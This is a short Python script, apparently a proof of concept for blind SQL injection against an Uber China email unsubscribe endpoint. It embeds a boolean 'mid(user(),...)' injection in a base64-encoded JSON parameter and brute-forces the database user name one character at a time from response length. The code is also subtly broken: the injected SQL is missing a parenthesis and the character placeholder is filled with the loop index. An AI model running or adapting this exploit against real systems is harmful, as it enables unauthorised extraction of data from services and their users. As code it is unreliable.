import json
import string
import requests

from urllib import quote
from base64 import b64encode

base = string.digits + string.letters + '_@.'
payload = {"user_id":5755, "receiver": "blog.oranga.tw"}
for i in range(30):
	for j in base:
		payload['user_id'] = "5755 and mid(user(),%d,1='%c'#"%(i+1,i)
		new_payload = json.dumps(payload)
		new_payload = b64encode(new_payload)
		r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p='+quote(new_payload))
		if len(r.content) > 0:
			print(i)
			break
